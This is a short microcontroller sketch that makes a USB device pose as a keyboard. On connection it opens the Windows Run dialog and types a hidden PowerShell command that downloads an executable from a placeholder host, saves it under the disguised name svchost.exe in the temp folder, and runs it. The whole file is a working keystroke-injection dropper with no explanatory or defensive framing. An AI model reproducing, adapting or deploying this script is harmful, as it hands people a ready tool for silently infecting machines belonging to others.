#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://example.com/malware.exe' -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe\""));
}

void loop() {}
